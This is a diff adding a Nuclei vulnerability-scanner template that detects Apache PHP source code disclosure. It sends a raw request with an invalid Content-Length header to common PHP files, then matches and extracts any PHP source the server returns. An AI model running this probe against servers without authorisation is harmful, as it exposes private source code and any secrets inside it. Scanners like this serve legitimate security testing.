@@ -1,0 +1,47 @@
+id: apache-content-length-source-disclosure
+
+info:
+  name: Apache Web Server Source Code Disclosure via Content-Length Manipulation
+  author: Kaimi
+  severity: high
+  description: |
+    Detects source code disclosure vulnerabilities caused by improper handling
+    of Content-Length headers. Sending invalid Content-Length values can cause
+    servers to return unprocessed PHP files.
+  reference:
+    - https://github.com/kaimi-/kaimi-nuclei-templates
+    - https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf
+    - https://owasp.org/www-community/vulnerabilities/Improper_Error_Handling
+  tags: misconfig,apache,content-length,source-disclosure
+
+http:
+  - raw:
+    - |+
+      GET /{{path}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Length: x
+
+    unsafe: true
+
+    payloads:
+      path:
+        - "index.php"
+        - "phpinfo.php"
+        - "info.php"
+
+    matchers:
+      - type: regex
+        regex:
+          - '(?i)<\?php'
+          - '(?i)<\?'
+        condition: or
+        part: body
+
+    extractors:
+      - type: regex
+        regex:
+          - '(?i)(<\?php[^\?]*\?>)'
+        part: body
+
+    max-redirects: 2
+    matchers-condition: and
